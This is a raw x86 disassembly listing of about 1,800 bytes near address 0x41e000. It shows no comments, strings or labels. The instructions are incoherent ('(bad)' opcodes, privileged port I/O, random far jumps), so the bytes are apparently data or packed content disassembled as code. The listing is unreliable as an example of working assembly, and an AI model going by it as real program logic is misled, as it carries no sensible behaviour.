  41e036:	outs   dx,DWORD PTR ds:[esi]
  41e037:	clc    
  41e038:	fdiv   st,st(7)
  41e03a:	sbb    ecx,DWORD PTR [ebp+0x5e]
  41e03d:	mov    cl,0x12
  41e03f:	rcr    DWORD PTR [ebx+0x6],cl
  41e042:	ret    0xeb5d
  41e045:	pushf  
  41e046:	daa    
  41e047:	xlat   BYTE PTR ds:[ebx]
  41e048:	(bad)  [esi-0x64137d70]
  41e04e:	sahf   
  41e04f:	(bad)  
  41e050:	ins    BYTE PTR es:[edi],dx
  41e051:	sub    DWORD PTR [edi-0x6a],esp
  41e054:	retf   
  41e055:	sahf   
  41e056:	retf   0xf3ad
  41e059:	stos   BYTE PTR es:[edi],al
  41e05a:	data16 cs add al,0x85
  41e05e:	sbb    cl,al
  41e060:	cdq    
  41e061:	push   eax
  41e062:	inc    ebx
  41e063:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e064:	aaa    
  41e065:	in     eax,dx
  41e066:	pop    eax
  41e067:	pop    ecx
  41e068:	mov    ah,0x8a
  41e06a:	push   ds
  41e06b:	cmp    esp,DWORD PTR [esi-0x38]
  41e06e:	xor    eax,0x39fcd5b0
  41e073:	push   cs
  41e074:	sbb    BYTE PTR [ebx+edx*1+0x5e],dl
  41e078:	pusha  
  41e079:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e07a:	in     al,dx
  41e07b:	cwde   
  41e07c:	and    BYTE PTR [eax-0xe],dh
  41e07f:	test   DWORD PTR [ebx],ebx
  41e081:	cmp    esi,esp
  41e083:	ror    BYTE PTR [ebp+0x4f5f70c0],1
  41e089:	stos   BYTE PTR es:[edi],al
  41e08a:	repnz xchg edi,eax
  41e08c:	hlt    
  41e08d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e08e:	hlt    
  41e08f:	test   DWORD PTR [esi],eax
  41e091:	test   eax,0x295ae5c1
  41e096:	pop    edi
  41e097:	test   DWORD PTR [edx],ecx
  41e099:	pop    edx
  41e09a:	push   ebx
  41e09b:	pop    ss
  41e09c:	jmp    0xe53d:0xf13c50c
  41e0a3:	inc    ebp
  41e0a4:	mov    al,ds:0x4dbc6e2
  41e0a9:	or     eax,0xc8725ace
  41e0ae:	jmp    0xf345e836
  41e0b3:	(bad)  
  41e0b4:	in     al,0x21
  41e0b6:	ss dec esp
  41e0b8:	div    BYTE PTR [edx]
  41e0ba:	sbb    dh,BYTE PTR [edi]
  41e0bc:	xor    al,0x37
  41e0be:	jl     0x41e0f1
  41e0c0:	xchg   edi,eax
  41e0c1:	popa   
  41e0c2:	pop    ss
  41e0c3:	ins    BYTE PTR es:[edi],dx
  41e0c4:	ret    0xd410
  41e0c7:	jmp    0x5ae:0x4629f62c
  41e0ce:	lods   eax,DWORD PTR ds:[esi]
  41e0cf:	mov    ebp,fs
  41e0d1:	lods   eax,DWORD PTR ds:[esi]
  41e0d2:	push   esi
  41e0d3:	and    BYTE PTR [esi+0x27],0x85
  41e0d7:	push   cs
  41e0d8:	mov    cl,0x47
  41e0da:	and    dl,BYTE PTR [ebx-0xdc998a9]
  41e0e0:	ja     0x41e063
  41e0e2:	nop
  41e0e3:	mov    eax,0x9d40de72
  41e0e8:	dec    ecx
  41e0e9:	fnstsw WORD PTR [edi+0x42]
  41e0ec:	adc    DWORD PTR [ecx],ebx
  41e0ee:	adc    BYTE PTR [edi+esi*1],ah
  41e0f1:	scas   al,BYTE PTR es:[edi]
  41e0f2:	and    al,0xf9
  41e0f4:	dec    eax
  41e0f5:	or     BYTE PTR [edi-0x5a],al
  41e0f8:	out    0xa4,al
  41e0fa:	xor    bh,BYTE PTR [esi]
  41e0fc:	scas   eax,DWORD PTR es:[edi]
  41e0fd:	and    al,0xeb
  41e0ff:	sti    
  41e100:	cmp    eax,DWORD PTR [edi+eax*2]
  41e103:	sahf   
  41e104:	ins    DWORD PTR es:[edi],dx
  41e105:	ret    0x8497
  41e108:	dec    esi
  41e109:	xchg   edx,eax
  41e10a:	push   esp
  41e10b:	mov    esi,0xcc95bda7
  41e110:	imul   edi,DWORD PTR [edi+ebx*1+0x58fcdc03],0x6f
  41e118:	iret   
  41e119:	shl    DWORD PTR [ebx+0x29ddeb75],1
  41e11f:	cs jbe 0x41e0a6
  41e122:	in     al,0xc6
  41e124:	xchg   ebx,eax
  41e125:	fstp   DWORD PTR [ebx+esi*4+0x2f]
  41e129:	push   eax
  41e12a:	sub    ah,ch
  41e12c:	mov    bl,0xa7
  41e12e:	jae    0x41e0cf
  41e130:	test   al,0x38
  41e132:	sahf   
  41e133:	out    dx,al
  41e134:	rcr    DWORD PTR [esi+0x25],1
  41e137:	jg     0x41e169
  41e139:	rcr    DWORD PTR [esi-0x28],cl
  41e13c:	push   esi
  41e13d:	sub    bh,dl
  41e13f:	pop    edi
  41e140:	cmc    
  41e141:	ins    BYTE PTR es:[edi],dx
  41e142:	loope  0x41e11e
  41e144:	xor    DWORD PTR [esi+0x16],ecx
  41e147:	or     BYTE PTR [edx],ch
  41e149:	xchg   ecx,eax
  41e14a:	pop    esi
  41e14b:	sbb    BYTE PTR [eax+edi*2-0x11],ch
  41e14f:	imul   esp,ebp,0xffffffa7
  41e152:	adc    DWORD PTR [edx+0xc02948e],0x74897c88
  41e15c:	cmp    ebx,esp
  41e15e:	pop    esp
  41e15f:	fldcw  WORD PTR [ecx-0x463c7685]
  41e165:	mov    esp,0xa82196a2
  41e16a:	fwait
  41e16b:	inc    eax
  41e16c:	pop    eax
  41e16d:	xchg   ecx,eax
  41e16e:	cld    
  41e16f:	adc    eax,0x639485f9
  41e174:	(bad)  
  41e175:	push   eax
  41e176:	sub    DWORD PTR [ebx],ebx
  41e178:	inc    esp
  41e179:	push   ebx
  41e17a:	popf   
  41e17b:	repz dec esi
  41e17d:	mov    cl,0x3c
  41e17f:	xor    BYTE PTR [edx+0x13],ah
  41e182:	adc    ebp,0x6a
  41e185:	scas   eax,DWORD PTR es:[edi]
  41e186:	imul   edi,DWORD PTR [ecx+eiz*1-0x57],0xe4e6323
  41e18e:	repz push 0x7c
  41e191:	fst    QWORD PTR [edi-0x1d]
  41e194:	mov    ecx,ebx
  41e196:	mov    ds:0x5891a446,al
  41e19b:	lahf   
  41e19c:	mov    esp,0x5b90cc1a
  41e1a1:	pop    edx
  41e1a2:	ins    DWORD PTR es:[edi],dx
  41e1a3:	vpaddd xmm4,xmm5,XMMWORD PTR [edx+eiz*4+0x5d]
  41e1a9:	jo     0x41e1ee
  41e1ab:	xor    bh,BYTE PTR [ebx]
  41e1ad:	icebp  
  41e1ae:	pop    ebx
  41e1af:	jb     0x41e1aa
  41e1b1:	idiv   DWORD PTR [edx-0x7ef9bc46]
  41e1b7:	mov    dh,0x4
  41e1b9:	lock sti 
  41e1bb:	jge    0x41e20d
  41e1bd:	loop   0x41e1ac
  41e1bf:	inc    edi
  41e1c0:	out    0x61,al
  41e1c2:	das    
  41e1c3:	icebp  
  41e1c4:	sbb    al,0xf9
  41e1c6:	cs jg  0x41e22f
  41e1c9:	sbb    BYTE PTR [ebp+0x4015c265],ah
  41e1cf:	mov    eax,ds:0xedf823b7
  41e1d4:	out    0x76,eax
  41e1d6:	push   0x66
  41e1d8:	out    0x7e,al
  41e1da:	dec    ecx
  41e1db:	inc    esi
  41e1dc:	aas    
  41e1dd:	arpl   WORD PTR [ebp+0x63641dbf],di
  41e1e3:	fld    DWORD PTR [ecx-0x1e]
  41e1e6:	or     al,0x55
  41e1e8:	ss push 0x1d8336c4
  41e1ee:	jecxz  0x41e240
  41e1f0:	mov    WORD PTR [ebx-0x1538eeb],fs
  41e1f6:	push   esi
  41e1f7:	mov    al,ds:0xc684cf8c
  41e1fc:	pop    esi
  41e1fd:	xor    al,0xd6
  41e1ff:	sbb    ebx,esi
  41e201:	loope  0x41e26b
  41e203:	and    DWORD PTR [ebx+0x2f],ecx
  41e206:	enter  0xde9,0x3c
  41e20a:	adc    ah,BYTE PTR [ebp+0xc]
  41e20d:	mov    bh,0xb2
  41e20f:	dec    ecx
  41e210:	or     BYTE PTR [eax+0x2b0f6cad],dh
  41e216:	mov    ds:0x6c85c6f6,al
  41e21b:	ret    
  41e21c:	add    bl,BYTE PTR [ebp+0x65]
  41e21f:	fs pop ecx
  41e221:	mov    ch,0xdd
  41e223:	loopne 0x41e1ba
  41e225:	je     0x41e2a2
  41e227:	jae    0x41e297
  41e229:	sar    ebp,0x1e
  41e22c:	fsub   DWORD PTR [ebx+ebx*2-0xdb87602]
  41e233:	inc    eax
  41e234:	rep ds ins BYTE PTR es:[edi],dx
  41e237:	jg     0x41e1d5
  41e239:	inc    ecx
  41e23a:	jp     0x41e257
  41e23c:	cmp    BYTE PTR [ecx],ah
  41e23e:	sar    DWORD PTR [esi-0x62],0xe
  41e242:	push   esi
  41e243:	xor    al,0xa4
  41e245:	xchg   edx,eax
  41e246:	adc    eax,0x153ded3d
  41e24b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e24c:	xchg   ebx,eax
  41e24d:	lods   al,BYTE PTR ds:[esi]
  41e24e:	xchg   esp,eax
  41e24f:	ins    BYTE PTR es:[edi],dx
  41e250:	dec    edi
  41e251:	out    0x11,al
  41e253:	cli    
  41e254:	xchg   ecx,eax
  41e255:	(bad)  
  41e257:	lods   eax,DWORD PTR ds:[esi]
  41e258:	aas    
  41e259:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e25a:	stos   BYTE PTR es:[edi],al
  41e25b:	add    eax,0x4306cdab
  41e260:	aad    0xd5
  41e262:	inc    ecx
  41e263:	cli    
  41e264:	in     al,0x29
  41e266:	outs   dx,DWORD PTR ds:[esi]
  41e267:	cmc    
  41e268:	popf   
  41e269:	push   eax
  41e26a:	pushf  
  41e26b:	jp     0x41e2b2
  41e26d:	outs   dx,DWORD PTR ds:[esi]
  41e26e:	mov    al,BYTE PTR [esi+0x34993009]
  41e274:	mov    al,0xce
  41e276:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e277:	ss cld 
  41e279:	mov    eax,0x7998d0e1
  41e27e:	mov    DWORD PTR [esp+ebp*4],esi
  41e281:	stos   DWORD PTR es:[edi],eax
  41e282:	imul   esp,DWORD PTR [edx+0x5c],0xffffffff
  41e286:	sar    DWORD PTR [esi-0x4f],cl
  41e289:	aam    0x9e
  41e28b:	sub    eax,0x1018f4bd
  41e290:	pop    ebx
  41e291:	sub    edi,DWORD PTR [eax]
  41e293:	repz inc ebp
  41e295:	dec    esp
  41e296:	outs   dx,BYTE PTR ds:[esi]
  41e297:	ror    BYTE PTR [esi+eax*8-0x7cd98d33],0xa8
  41e29f:	je     0x41e2fb
  41e2a1:	dec    ebp
  41e2a2:	jnp    0x41e2df
  41e2a4:	sbb    DWORD PTR [ecx-0xa3083d6],edx
  41e2aa:	(bad)  
  41e2ab:	xchg   ebp,eax
  41e2ac:	fst    st(6)
  41e2ae:	push   ds
  41e2af:	adc    eax,0x671d672e
  41e2b4:	mov    DWORD PTR [esi-0x1dd7a547],edx
  41e2ba:	fcomp  QWORD PTR [esi-0x3c366d75]
  41e2c0:	lock imul DWORD PTR [ecx]
  41e2c3:	pop    edi
  41e2c4:	imul   esp,DWORD PTR [esi+ebx*1],0x68cf53d0
  41e2cb:	fsub   QWORD PTR [ecx]
  41e2cd:	xchg   DWORD PTR [edi+edi*8+0x1a339f5f],ebx
  41e2d4:	sar    dh,1
  41e2d6:	inc    ebp
  41e2d7:	push   esp
  41e2d8:	xchg   ebx,eax
  41e2d9:	or     al,0x5c
  41e2db:	and    eax,esp
  41e2dd:	fldcw  WORD PTR [edx-0x31]
  41e2e0:	arpl   WORD PTR [esi+0x5fe4a795],cx
  41e2e6:	stos   BYTE PTR es:[edi],al
  41e2e7:	cmp    edx,ecx
  41e2e9:	aam    0x9c
  41e2eb:	and    BYTE PTR [edi-0x4c],dh
  41e2ee:	fwait
  41e2ef:	dec    ecx
  41e2f0:	(bad)
  41e2f3:	outs   dx,BYTE PTR ds:[esi]
  41e2f4:	push   ds
  41e2f5:	push   edi
  41e2f6:	lods   eax,DWORD PTR ds:[esi]
  41e2f7:	or     eax,0x5548ccc1
  41e2fc:	outs   dx,DWORD PTR ds:[esi]
  41e2fd:	xchg   BYTE PTR [ebx-0x53e2de56],bl
  41e303:	cmp    eax,ebx
  41e305:	pop    ds
  41e306:	outs   dx,BYTE PTR ds:[esi]
  41e307:	retf   
  41e308:	and    al,0xd4
  41e30a:	punpcklwd mm5,DWORD PTR [ebx]
  41e30d:	gs mov dh,0x17
  41e310:	sbb    ch,cl
  41e312:	lea    ebx,[eax+0xbcbc489]
  41e318:	(bad)  
  41e31a:	int    0x3
  41e31c:	cmp    DWORD PTR [edi-0x647e0421],0x6b843c7d
  41e326:	mov    dh,BYTE PTR [ebp-0x6eaf44ee]
  41e32c:	fsub   QWORD PTR [edx+0x73466334]
  41e332:	mov    DWORD PTR [ebx-0x16],esp
  41e335:	sub    BYTE PTR [esi+0x73736a6e],bh
  41e33b:	lock scas al,BYTE PTR es:[edi]
  41e33d:	shr    esi,cl
  41e33f:	pop    ecx
  41e340:	mov    eax,0x9988461
  41e345:	call   0x6b51fc1
  41e34a:	(bad)  
  41e34c:	pop    eax
  41e34d:	fmul   QWORD PTR [ebx]
  41e34f:	cmp    DWORD PTR [esi+0x88db43f],ecx
  41e355:	shl    DWORD PTR ds:0x597f21df,cl
  41e35b:	scas   eax,DWORD PTR es:[edi]
  41e35c:	xchg   ebp,eax
  41e35d:	rcl    DWORD PTR [ecx+0x54],0xfd
  41e361:	add    eax,DWORD PTR [edx+0x3abb87e4]
  41e367:	and    eax,DWORD PTR [ebx+0x4b]
  41e36a:	popa   
  41e36b:	sbb    BYTE PTR [edx+0x1f],0xc6
  41e36f:	jg     0x41e3a0
  41e371:	rcr    BYTE PTR [ecx-0x54],1
  41e374:	ins    BYTE PTR es:[edi],dx
  41e375:	adc    al,0xe4
  41e377:	inc    esi
  41e378:	mov    eax,ebp
  41e37a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e37b:	out    dx,eax
  41e37c:	les    esp,FWORD PTR [ecx+0x51]
  41e37f:	jmp    0xb819:0x58673dbb
  41e386:	pop    edi
  41e387:	mov    ebp,0x55a1d17c
  41e38c:	lods   al,BYTE PTR ds:[esi]
  41e38d:	sub    eax,0x62a36e46
  41e392:	adc    BYTE PTR [edx-0x54],dh
  41e395:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e397:	mov    ebp,0x5ea2c6b5
  41e39c:	and    al,0x7e
  41e39e:	int3   
  41e39f:	sbb    dh,0xea
  41e3a2:	lods   al,BYTE PTR ds:[esi]
  41e3a3:	jb     0x41e355
  41e3a5:	aam    0x72
  41e3a7:	mov    DWORD PTR [eax-0xc],esi
  41e3aa:	mov    ebp,0x6100e8eb
  41e3af:	into   
  41e3b0:	dec    esi
  41e3b1:	jmp    0xc415:0x2014eaf5
  41e3b8:	pop    es
  41e3b9:	ins    BYTE PTR es:[edi],dx
  41e3ba:	mov    ebp,0xff85d13d
  41e3bf:	and    al,BYTE PTR [eax-0x4c]
  41e3c2:	pop    esp
  41e3c3:	repnz fdivr DWORD PTR [edx+eax*8]
  41e3c7:	(bad)  
  41e3c8:	pop    ebx
  41e3c9:	das    
  41e3ca:	and    BYTE PTR [esi],cl
  41e3cc:	je     0x41e3f1
  41e3ce:	ss (bad) 
  41e3d0:	int    0x9a
  41e3d2:	push   ds
  41e3d3:	icebp  
  41e3d4:	(bad)  
  41e3d5:	clc    
  41e3d6:	fcmovb st,st(1)
  41e3d8:	sbb    al,0x9c
  41e3da:	int3   
  41e3db:	ins    DWORD PTR es:[edi],dx
  41e3dc:	inc    ebx
  41e3dd:	pop    es
  41e3de:	pop    ebp
  41e3df:	and    eax,0x39674529
  41e3e4:	dec    ebp
  41e3e5:	mov    al,0x14
  41e3e7:	int    0xfa
  41e3e9:	hlt    
  41e3ea:	sub    al,0x8a
  41e3ec:	sub    al,0xdd
  41e3ee:	sbb    al,0x60
  41e3f0:	jle    0x41e3d7
  41e3f2:	loope  0x41e435
  41e3f4:	sub    BYTE PTR [ecx+edx*2],ah
  41e3f7:	fucomi st,st(6)
  41e3f9:	lods   al,BYTE PTR ds:[esi]
  41e3fa:	push   esp
  41e3fb:	push   0xffffffc9
  41e3fd:	mov    edx,0x25b0f336
  41e402:	jns    0x41e447
  41e404:	and    edi,eax
  41e406:	sub    DWORD PTR ds:0xc6ca84a8,esi
  41e40c:	jle    0x41e3ca
  41e40e:	shl    cl,0x8c
  41e411:	repz mov ch,BYTE PTR [ebp-0x57]
  41e415:	pop    ecx
  41e416:	jmp    0x41e39a
  41e418:	es pop ebp
  41e41a:	mov    ebx,0xed9a171a
  41e41f:	jns    0x41e3b0
  41e421:	in     eax,dx
  41e422:	sbb    BYTE PTR [edi],bh
  41e424:	mov    ebp,0xcf659e4c
  41e429:	push   0x63
  41e42b:	bound  ebx,QWORD PTR [ecx]
  41e42d:	pushf  
  41e42e:	push   esp
  41e42f:	adc    BYTE PTR [ebp-0x7a],0xc5
  41e433:	mov    DWORD PTR [ebx+0x11],0xb0b99201
  41e43a:	inc    ecx
  41e43b:	lahf   
  41e43c:	add    DWORD PTR [edx-0x6d],esp
  41e43f:	in     al,dx
  41e440:	mov    edi,0x964b5751
  41e445:	loop   0x41e46f
  41e447:	or     eax,0x3e1d9681
  41e44c:	sub    DWORD PTR [eax-0x7984763],esp
  41e452:	cmp    bh,dl
  41e454:	test   esp,eax
  41e456:	out    0x50,eax
  41e458:	stc    
  41e459:	add    al,0x3d
  41e45b:	cmp    cl,BYTE PTR [ebx+0x49a17a05]
  41e461:	jmp    0x4f10022a
  41e466:	cmp    edx,DWORD PTR [ecx+0x9]
  41e469:	inc    ebp
  41e46a:	dec    ecx
  41e46b:	and    ebx,DWORD PTR [ecx]
  41e46d:	ret    
  41e46e:	adc    BYTE PTR [edi-0x4],0x13
  41e472:	xlat   BYTE PTR ds:[ebx]
  41e473:	(bad)  
  41e474:	jmp    0x41e428
  41e476:	jp     0x41e44f
  41e478:	dec    edx
  41e479:	sub    DWORD PTR [edx+ecx*2-0x4733f165],0x63
  41e481:	fist   WORD PTR [ebp+eax*8-0x58c3627f]
  41e488:	xor    eax,0x8e5b1536
  41e48d:	gs inc ecx
  41e48f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e490:	push   eax
  41e491:	out    dx,eax
  41e492:	mov    ecx,0x637a002e
  41e497:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e498:	mov    bl,0x55
  41e49a:	ja     0x41e424
  41e49c:	or     esp,DWORD PTR [edx-0x59]
  41e49f:	push   DWORD PTR [esi]
  41e4a1:	pop    eax
  41e4a2:	(bad)  
  41e4a3:	stos   BYTE PTR es:[edi],al
  41e4a4:	or     BYTE PTR [edi-0x25],bh
  41e4a7:	cmp    edi,ebx
  41e4a9:	in     eax,dx
  41e4aa:	ret    0x2150
  41e4ad:	mov    edx,ebp
  41e4af:	imul   ecx,DWORD PTR [esi-0x469d424a],0x43a3a10
  41e4b9:	dec    edx
  41e4ba:	and    al,BYTE PTR [ecx+eiz*2]
  41e4bd:	pandn  mm0,QWORD PTR [edx-0x5c]
  41e4c1:	mov    al,ds:0xba5c0e0
  41e4c6:	(bad)  [ebx-0x7e743a61]
  41e4cc:	xor    BYTE PTR [edx],ch
  41e4ce:	je     0x41e529
  41e4d0:	retf   
  41e4d1:	mov    bh,0xb9
  41e4d3:	imul   edi,esp,0xe84c490f
  41e4d9:	syscall 
  41e4db:	xchg   ebp,eax
  41e4dc:	mov    ds:0x9f969212,al
  41e4e1:	cmc    
  41e4e2:	(bad)  [ecx-0x35]
  41e4e5:	test   DWORD PTR [ebx+0x7c0ac250],esp
  41e4eb:	xchg   ebp,eax
  41e4ec:	retf   0x9b50
  41e4ef:	mov    dl,0x69
  41e4f1:	sub    esi,DWORD PTR [esi+0xdeb1a03]
  41e4f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e4f8:	ins    BYTE PTR es:[edi],dx
  41e4f9:	pop    eax
  41e4fa:	sbb    DWORD PTR [ecx],0xc9589319
  41e500:	stos   BYTE PTR es:[edi],al
  41e501:	xchg   DWORD PTR [ecx],esp
  41e503:	add    eax,0x7a4a031c
  41e508:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e509:	push   0xffffffe3
  41e50b:	int3   
  41e50c:	dec    ebp
  41e50d:	push   ds
  41e50e:	stos   BYTE PTR es:[edi],al
  41e50f:	push   eax
  41e510:	add    ebx,DWORD PTR [edi+0xf]
  41e513:	loopne 0x41e50b
  41e515:	leave  
  41e516:	repnz push 0x5dcd219a
  41e51c:	ret    
  41e51d:	xor    ebp,0x789d5190
  41e523:	sub    ch,BYTE PTR [ecx]
  41e525:	call   0x5087:0xd31e0693
  41e52c:	ficomp WORD PTR [ecx]
  41e52e:	mov    dl,0xa0
  41e530:	fwait
  41e531:	mov    dl,0x3d
  41e533:	xchg   esp,eax
  41e534:	iret   
  41e535:	out    0xba,al
  41e537:	or     ah,dl
  41e539:	(bad)  
  41e53a:	rcr    DWORD PTR ds:0x7cb34912,cl
  41e540:	jno    0x41e532
  41e542:	imul   dx,WORD PTR [eax-0x32],0xff86
  41e547:	mov    dl,0x9d
  41e549:	pop    ebx
  41e54a:	jecxz  0x41e4e3
  41e54c:	fcomp  QWORD PTR [ebx-0x13]
  41e54f:	mov    ah,0xf1
  41e551:	dec    ecx
  41e552:	add    al,al
  41e554:	xchg   esi,eax
  41e555:	fisttp WORD PTR [esi]
  41e557:	mov    esi,0x5e2ca1e3
  41e55c:	inc    edx
  41e55d:	inc    eax
  41e55e:	or     ebp,esi
  41e560:	push   edx
  41e561:	jg     0x41e50d
  41e563:	ss pop ecx
  41e565:	cmc    
  41e566:	adc    ebx,DWORD PTR [eax]
  41e568:	jnp    0x41e5a8
  41e56a:	ficom  WORD PTR [ecx+esi*2+0x4e0d16e3]
  41e571:	loope  0x41e5e5
  41e573:	fyl2x  
  41e575:	iret   
  41e576:	(bad)  
  41e577:	les    ebp,FWORD PTR [ebp-0x4e4cbb66]
  41e57d:	mov    edx,0x24301c7e
  41e582:	je     0x41e547
  41e584:	or     DWORD PTR [ebp-0x1af205b5],edi
  41e58a:	loopne 0x41e5be
  41e58c:	add    al,0x8e
  41e58e:	out    dx,al
  41e58f:	pop    esp
  41e590:	pop    ds
  41e591:	mov    bh,0xe4
  41e593:	mov    ds:0xcda7b957,al
  41e598:	in     eax,dx
  41e599:	pop    ds
  41e59a:	adc    eax,0x9d93334a
  41e59f:	adc    ecx,esp
  41e5a1:	sub    eax,0xe4af3fe3
  41e5a6:	aad    0x0
  41e5a8:	loop   0x41e61d
  41e5aa:	(bad)  
  41e5ab:	repnz or cl,al
  41e5ae:	mov    edx,0x2e7939b8
  41e5b3:	stc    
  41e5b4:	adc    DWORD PTR [esi],0xffffffa2
  41e5b7:	mov    ebx,0x54ed07e3
  41e5bc:	dec    edx
  41e5bd:	lahf   
  41e5be:	lahf   
  41e5bf:	jp     0x41e56a
  41e5c1:	addr16 fs out 0x96,al
  41e5c5:	ret    
  41e5c6:	(bad)  
  41e5c7:	cmp    bh,BYTE PTR [eax-0x5b]
  41e5ca:	out    dx,eax
  41e5cb:	pop    es
  41e5cc:	sti    
  41e5cd:	pop    ds
  41e5ce:	gs xor edx,esp
  41e5d1:	lahf   
  41e5d2:	je     0x41e56c
  41e5d4:	in     al,dx
  41e5d5:	pusha  
  41e5d6:	(bad)  
  41e5d8:	sbb    bl,BYTE PTR [eax]
  41e5da:	push   edx
  41e5dc:	xor    eax,DWORD PTR [eax+0x44b1f358]
  41e5e2:	fdivr  QWORD PTR [ebx-0x1b]
  41e5e5:	lods   al,BYTE PTR ds:[esi]
  41e5e6:	jnp    0x41e64d
  41e5e8:	cmp    eax,0xde7c2207
  41e5ed:	rol    DWORD PTR [edi+0x29c1ac57],1
  41e5f3:	daa    
  41e5f4:	aaa    
  41e5f5:	jp     0x41e66d
  41e5f7:	fild   WORD PTR [ebx+ebp*2-0x2f]
  41e5fb:	shl    BYTE PTR [eax],cl
  41e5fd:	mov    ds:0x95946ef,al
  41e602:	sbb    ebx,DWORD PTR [edi]
  41e604:	and    ch,BYTE PTR [esi-0x78]
  41e607:	test   al,0x9
  41e609:	lods   al,BYTE PTR ds:[esi]
  41e60a:	fs xchg esi,eax
  41e60c:	add    eax,0xb5a66c15
  41e611:	dec    ebp
  41e612:	and    edi,ebp
  41e614:	xor    DWORD PTR [edi+0x387b1e03],0x74
  41e61b:	jmp    0x13de:0xfc65dc73
  41e622:	xchg   ebx,eax
  41e623:	pop    edi
  41e624:	xchg   esp,eax
  41e625:	retf   0x2200
  41e628:	clc    
  41e629:	jecxz  0x41e5f1
  41e62b:	test   al,0x62
  41e62d:	or     dl,BYTE PTR [ebx+0x1d]
  41e630:	test   eax,0xd279cd16
  41e635:	fld    QWORD PTR [edi+0x34]
  41e638:	ror    BYTE PTR [edi+ebp*8],cl
  41e63b:	push   ss
  41e63c:	mov    ecx,0xfb293016
  41e641:	xor    DWORD PTR [ebx],edx
  41e643:	add    esi,esp
  41e645:	pop    esp
  41e646:	sbb    ecx,DWORD PTR [edx+0x24]
  41e649:	ja     0x41e690
  41e64b:	jb     0x41e5cd
  41e64d:	fsub   QWORD PTR es:[edx]
  41e650:	or     eax,0xc55526c7
  41e655:	mov    edi,0xd391765b
  41e65a:	test   al,0x67
  41e65c:	mov    ch,0x99
  41e65e:	(bad)  
  41e65f:	push   eax
  41e660:	mov    bh,0x8f
  41e662:	fstp   DWORD PTR [edi+0x51b8f1cc]
  41e668:	bound  edi,QWORD PTR [eax+0x2556aed]
  41e66e:	sbb    BYTE PTR [edi-0x64783273],dl
  41e674:	sub    DWORD PTR [eax],edi
  41e676:	push   ds
  41e677:	pop    ds
  41e678:	retf   
  41e679:	pop    edi
  41e67a:	add    al,0x10
  41e67c:	(bad)  
  41e67d:	jb     0x41e6f2
  41e67f:	jae    0x41e69a
  41e681:	leave  
  41e682:	jno    0x41e701
  41e684:	pop    edi
  41e685:	jl     0x41e6e3
  41e687:	dec    esp
  41e688:	dec    esp
  41e689:	lock cli 
  41e68b:	enter  0x6dfb,0x32
  41e68f:	inc    ebp
  41e690:	mov    eax,ds:0x366c6e2f
  41e695:	mov    dh,0xc6
  41e697:	add    al,BYTE PTR [edi]
  41e699:	into   
  41e69a:	lods   eax,DWORD PTR ds:[esi]
  41e69b:	push   0xdf912926
  41e6a0:	dec    ebp
  41e6a1:	jne    0x41e6b2
  41e6a3:	int    0x9b
  41e6a5:	out    dx,al
  41e6a6:	test   al,0x5f
  41e6a8:	push   ebx
  41e6a9:	mov    cl,0x2c
  41e6ab:	or     edi,DWORD PTR [ebx-0x28]
  41e6ae:	out    dx,al
  41e6af:	lea    esp,[eax-0x136fa810]
  41e6b5:	jmp    0x3dcc:0x542bf7b
  41e6bc:	fimul  WORD PTR [eax+0x43]
  41e6bf:	jecxz  0x41e713
  41e6c1:	jae    0x41e6f3
  41e6c3:	cmp    edx,DWORD PTR [eax]
  41e6c5:	ret    
  41e6c6:	add    eax,0xb204334d
  41e6cb:	test   BYTE PTR [ecx+0x6ccdb25e],bh
  41e6d1:	mov    edx,0x7b8814e3
  41e6d6:	inc    ebp
  41e6d7:	jge    0x41e6cb
  41e6d9:	and    dh,BYTE PTR [edx+0x6668ea50]
  41e6df:	retf   
  41e6e0:	imul   esp,DWORD PTR [ebx+ebp*4+0x25],0x8a3c2352
  41e6e8:	int    0xdc
  41e6ea:	data16 hlt 
  41e6ec:	aaa    
  41e6ed:	xlat   BYTE PTR ds:[ebx]
  41e6ee:	inc    ebx
  41e6ef:	push   edi
  41e6f0:	ret    
  41e6f1:	xchg   edx,eax
  41e6f2:	ficom  DWORD PTR [edx+0x60d52a07]
  41e6f8:	or     edi,DWORD PTR [ebx+ebp*2]
  41e6fb:	int    0xba
  41e6fd:	dec    esi
  41e6fe:	(bad)  
  41e6ff:	sub    ebx,DWORD PTR [ebx+0x42]
  41e702:	lea    edi,[ebx-0x18a6f50e]
  41e708:	into   
  41e709:	mov    ecx,0xde5b6b41
  41e70e:	in     eax,dx
  41e70f:	aad    0x4d
  41e711:	sub    al,0x44
  41e713:	sbb    ch,BYTE PTR [ebp+0x2c]
  41e716:	dec    BYTE PTR [ecx+0x6c]
  41e719:	add    eax,0x85e07c3a
  41e71e:	mov    al,0xdb
  41e720:	test   DWORD PTR [esi+0x13],esi
  41e723:	xchg   ebx,eax
  41e724:	jp     0x41e795
  41e726:	push   esi
  41e727:	out    dx,eax
  41e728:	mov    esp,0xe6335c54
  41e72d:	add    BYTE PTR [esi+0x78],bh
  41e730:	mov    ah,BYTE PTR [ecx+0x422a4508]
  41e736:	out    0x89,eax
  41e738:	or     eax,0xc22b7698
  41e73d:	pop    eax
  41e73e:	mov    esi,0x324b84b4
  41e743:	or     al,BYTE PTR [edx-0x77531edc]
  41e749:	xchg   ecx,eax
  41e74a:	daa    
  41e74b:	xchg   ecx,eax
  41e74c:	jecxz  0x41e716
  41e74e:	adc    DWORD PTR [edx],ebx
  41e750:	cli    
  41e751:	hlt    
  41e752:	loopne 0x41e772
  41e754:	adc    ebp,DWORD PTR [ebx+0x45eb7d5e]
  41e75a:	adc    bl,al
  41e75c:	clc    
  41e75d:	jecxz  0x41e7d9
  41e75f:	(bad)  
  41e760:	addr16 inc ebp
  41e762:	inc    esi
  41e763:	gs loopne 0x41e7e1
  41e766:	push   ecx
  41e767:	cmp    bl,dl
  41e769:	xchg   ecx,eax
  41e76a:	adc    eax,0xcc890167
